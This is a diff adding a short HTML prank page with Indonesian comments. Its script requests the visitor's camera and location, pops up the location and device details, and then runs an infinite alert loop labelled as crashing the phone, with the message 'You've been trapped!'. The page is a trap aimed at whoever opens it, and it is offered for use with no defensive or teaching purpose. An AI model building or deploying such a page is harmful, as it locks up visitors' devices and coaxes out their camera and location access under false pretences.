@@ -1,0 +1,25 @@
+<html>
+<body>
+<script>
+// Akses kamera
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+  document.body.innerHTML += "<video autoplay></video>";
+  document.querySelector("video").srcObject = stream;
+});
+
+// Akses lokasi
+navigator.geolocation.getCurrentPosition(pos => {
+  alert("Lokasi: " + pos.coords.latitude + ", " + pos.coords.longitude);
+});
+
+// Akses info device
+alert("Device: " + navigator.userAgent);
+
+// Crash HP (opsional)
+while(true) {
+  alert("Kamu kena jebakan!");
+}
+</script>
+</body>
+</html>
